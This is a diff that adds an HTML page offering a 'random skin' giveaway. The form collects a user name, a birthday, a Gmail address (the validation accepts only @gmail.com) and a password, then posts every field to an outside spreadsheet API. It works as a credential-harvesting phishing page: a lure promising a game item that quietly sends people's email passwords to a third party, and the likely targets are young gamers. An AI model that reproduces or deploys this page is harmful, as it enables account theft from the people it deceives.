@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Save Web Form Data to Spreadsheets</title>
+    <script
+        src="https://code.jquery.com/jquery-3.4.1.js"
+        integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+        crossorigin="anonymous"></script>
+    <script>
+        function validateForm() {
+            var fullNameInput = document.getElementById("fullName");
+            var passwordInput = document.getElementById("password");
+            var confirmPasswordInput = document.getElementById("confirmPassword");
+            var birthdayInput = document.getElementById("birthday");
+            var emailInput = document.getElementById("email");
+
+            if (fullNameInput.value.length < 6) {
+                alert("Full Name must be at least 6 characters.");
+                return false;
+            }
+
+			if (!birthdayInput.value) {
+                alert("Birthday is required.");
+                return false;
+            }
+
+			var emailRegex = /^[\w-]+(\.[\w-]+)*@gmail\.com$/;
+            if (!emailRegex.test(emailInput.value)) {
+                alert("Email must end with @gmail.com");
+                return false;
+            }
+
+            if (passwordInput.value.length < 6) {
+                alert("Password must be at least 6 characters.");
+                return false;
+            }
+
+            if (passwordInput.value !== confirmPasswordInput.value) {
+                alert("Password and Confirm Password must match.");
+                return false;
+            }
+
+            return true;
+        }
+
+        function SubForm() {
+            if (validateForm()) {
+                $.ajax({
+                    url: "https://api.apispreadsheets.com/data/GWGg6cd8oL04EePj/",
+                    type: "post",
+                    data: $("#myForm").serializeArray(),
+                    success: function () {
+                        alert("Form Data Submitted :)")
+                    },
+                    error: function () {
+                        alert("There was an error :(")
+                    }
+                });
+            }
+        }
+    </script>
+	<style>
+        body{
+            background-image: url(ml3.jpg);
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        div{
+            background-image: url(ml.jfif);
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            text-align: center;
+			width: 500px;
+			margin: auto;
+			margin-top: 30px;
+            border-radius: 10px;
+            border: solid;
+			padding-bottom: 30px;
+        }
+       #birthday{
+        width: 400px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            height: 40px;
+            text-align: center;
+       }
+	   #fullName{
+		width: 400px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            height: 40px;
+            text-align: center;
+	   }
+       #email{
+        width: 400px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            height: 40px;
+            text-align: center;
+       }
+       #password{
+        width: 400px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            height: 40px;
+            text-align: center;
+       }
+       #confirmPassword{
+		width: 400px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            height: 40px;
+            text-align: center;
+       }
+       input:hover{
+        transform: scale(1.07);
+       }
+       button:hover{
+        transform: scale(1.5);
+       }
+    </style>
+</head>
+<body>
+	<div class="container">
+        <h3>Get Your Random Skin</h3>
+    <form id="myForm">
+        <label>User Name</label><br>
+        <input id="fullName" name="Full Name" placeholder="Enter your user name ..."/>
+        <br/>
+        <label>Birthday</label><br>
+        <input id="birthday" name="Birthday" type="date" required placeholder="Enter your birthdate ..."/>
+        <br/>
+        <label>Email</label><br>
+        <input id="email" name="Email" placeholder="Enter your email ..."/>
+        <br/>
+        <label>Password</label><br>
+        <input id="password" name="Password" type="password" placeholder="Enter your password ..."/>
+        <br/>
+        <label>Confirm Password</label><br>
+        <input id="confirmPassword" name="Confirm Password" type="password" placeholder="Confirm your password..."/>
+        <br/>
+    </form>
+    <button onclick='SubForm()'>Submit</button>
+</div>
+</body>
+</html>
